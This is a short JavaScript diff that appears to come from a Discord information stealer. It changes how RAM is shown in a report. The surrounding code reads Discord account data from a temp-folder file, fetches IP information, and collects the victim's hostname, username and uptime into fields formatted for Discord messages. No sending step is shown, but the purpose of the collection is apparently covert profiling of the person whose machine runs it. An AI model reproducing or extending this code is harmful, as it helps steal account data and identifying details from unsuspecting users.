@@ -16,7 +16,7 @@ const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
   const computerInfoFields = [
-    ['RAM', Math.round(os.totalmem() / 1000) + 'MB'],
+    ['RAM', Math.floor(os.totalmem() / 1000 / 1000 / 1000) + 'GB'],
     ['Name', os.hostname()],
     ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
     ['Username', os.userInfo().username],
